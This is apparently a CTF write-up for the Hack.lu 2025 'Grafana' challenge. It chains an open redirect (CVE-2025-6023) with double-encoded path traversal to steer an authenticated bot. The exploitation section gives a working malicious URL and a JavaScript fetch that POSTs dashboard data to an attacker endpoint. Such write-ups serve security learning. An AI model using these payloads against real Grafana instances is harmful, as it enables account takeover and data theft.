---
title: "Hack.lu CTF 2025 - Grafana"
subtitle: "We heard that CVE-2025-6023 was pretty epic.. but the fix wasn't?!"
excerpt: "We heard that CVE-2025-6023 was pretty epic.. but the fix wasn't?!"
date: 2025-10-17
categories: [web]
tags: [openRedirect, pathTraversal, xss]
ctfs: [hacklu25]
author_profile: true
sidebar:
  nav: "docs"
header:
  overlay_color: "#000"
---

# Recon

Here is the challenge files hierarchy :

```
.  
└── public
    ├── bot
    │   ├── Dockerfile
    │   ├── bot.js
    │   ├── bun.lock
    │   ├── index.js
    │   ├── package.json
    │   └── public
    │       └── index.html
    ├── compose.yml
    └── grafana
        ├── Dockerfile
        ├── dashboard.json
        ├── entrypoint-wrapper.sh
        └── provisioning
            └── dashboards.yml
```

The challenge is about a `Grafana` instance, on which a pre-loaded dashboard contains the flag, in an annotation :

`dashboard.json`
```json
[...]
  "annotations": {
    "list": [
      {
        "builtIn": 1,
        "datasource": {
          "type": "grafana",
          "uid": "-- Grafana --"
        },
        "enable": true,
        "hide": false,
        "iconColor": "rgba(255, 96, 96, 1)",
        "name": "Flag",
        "target": {
          "limit": 100,
          "matchAny": false,
          "tags": [
            "flag{fake_flag}"
          ],
          "type": "dashboard"
        },
        "type": "dashboard"
      }
    ]
  },
[...]
```

# Investigation

We have access to a bot, which allows us to query any internal grafana url using `Puppeteer`, a chrome browser simulator : 

`index.js`
```javascript
app.post('/visit', async (req, res) => {

	// [...]
	
    if (parsedUrl.protocol !== 'http:' ||
        parsedUrl.hostname !== 'grafana' ||
        parsedUrl.port !== '3000') {
        return res.status(400).json({
            error: 'URL must start with http://grafana:3000'
        });
    }

    try {
        console.log(`Bot visiting: ${url}`);
        await goto(url);
        res.json({ success: true, message: 'Bot visited the URL successfully' });
    } catch (error) {
        // [...]
    }
});
```

`bot.js`
```javascript
const goto = async (url) => {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            executablePath: "/usr/bin/google-chrome-stable",
            args: [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                '--js-flags="--noexpose_wasm"'
            ],
        });
        const page = await browser.newPage();
        page.setDefaultNavigationTimeout(10 * 1000);

        await page.goto("http://grafana:3000/login", {
            waitUntil: "networkidle0",
        });

        const username = "viewer";
        const password = "you_can_try_to_guess_this_too";

        await page.type('[name="user"]', username, { delay: 100 });
        await page.type('[name="password"]', password, { delay: 100 });

        await page.waitForSelector('[type="submit"]', {
            visible: true,
        });
        await page.click('[type="submit"]');

        await page.waitForNavigation({ waitUntil: "networkidle0" });
        console.log(`Navigated to: ${page.url()}`);

        if (page.url().includes("login")) {
            throw new Error("Login failed!");
        }

        await sleep(1000);

        console.log(`Navigating to target URL: ${url}`);
        await page.goto(url, {
            waitUntil: "networkidle0",
            timeout: 10000
        });
        console.log(`Successfully navigated to: ${url}`);

        await sleep(2000);

    } catch (error) {
        // [...]
    } finally {
        // [...]
    }
}
```

The `CVE-2025-6023`, given as an hint in the challenge's description, is about an open redirect, possible when an authenticated user accesses this route : `/user/auth-tokens/rotate?redirectTo=<value>`, thtat responds with `302 Redirect` and returns a `Location: <value>` header, with value being a user-input variable. As the `Puppeteer` session is authenticated, this will be our entrypoint. 

> https://www.opswat.com/blog/grafana-cve-2025-6023-unit-515-discovers-incomplete-fix-that-leads-to-full-account-takeover

In `Grafana`, it is possible to retrieve a dashboard's content and configuration using this route : `/api/dashboards/<uid>/secure-flag-storage`, we'll use this url in order to get the flag.

# Attack pipeline

- Craft a malicious URL for the bot which leads to one of our endpoint
- Write a javascript code retrieving the dashboard informations and sending them to one of our endpoint

# Exploitation

The `/dashboard/script` has been disclosed as vulnerable to **path traversal**, therefore, this path will allow us to access the `/user/auth-tokens/rotate?redirectTo=<value>` route, which is the core vulnerable route of the CVE.

Here is the final malicious url : 

`http://grafana:3000/dashboard/script/.%253F%2F..%2F..%2F..%2F..%2Fuser%2Fauth-tokens%2Frotate%3FredirectTo=%2Ffoo%2523%2F..%2F%5C<endpoint>`

In order to bypass filters and chose when will our url be parsed and interpreted, we have to use double-encoding. The double-encoded *?* at the beginning of the URL will allow use to avoid the **path traversal** to be squeezed by the web engine, making it interpreted by the the `Grafana` server and thus, effective.

The fact the url is reached in a browser environment allows us to provide a *#* symbol, which is not sent to the server but will be interpreted as a redirection by the browser. It is possible because the route returns this header : 

```
302 Location: /foo#/../\<endpoint>
```

Then, the browser will interpret the *#* and redirect the user to the malicious url, using `../` to delete the `/foo` fragment. Then the browser will normalize `/\` into `//`, thus interpreted as `https://` : 

```
302 Location: https://<endpoint>
```

Now, we only need a *js* script retrieving the dashboard informations and sending them to our endpoint : 

```javascript
fetch("/api/dashboards/uid/secure-flag-storage")
  .then(r => r.json())
  .then(data => fetch("<endpoint>", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  }));
```

We now receive the flag on our endpoint : 

```json
[...]
"dashboard": {
    "annotations": {
      "list": [
        {
          "builtIn": 1,
          "datasource": {
            "type": "grafana",
            "uid": "-- Grafana --"
          },
          "enable": true,
          "hide": false,
          "iconColor": "rgba(255, 96, 96, 1)",
          "name": "Flag",
          "target": {
            "limit": 100,
            "matchAny": false,
            "tags": [
              "flag{m0Ar_gr4phZ_Mo4r_VuLnZ_27e169d0741cd4}"
            ],
            "type": "dashboard"
          },
          "type": "dashboard"
        }
      ]
    },
[...]
```

> flag{m0Ar_gr4phZ_Mo4r_VuLnZ_27e169d0741cd4}
